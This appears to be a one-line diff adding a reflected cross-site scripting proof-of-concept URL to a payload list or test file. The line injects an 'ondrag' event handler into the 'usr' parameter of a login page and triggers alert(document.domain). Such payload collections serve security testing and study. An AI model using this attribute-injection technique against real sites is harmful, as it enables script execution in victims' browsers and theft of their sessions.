@@ -1,0 +1,1 @@
+/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p
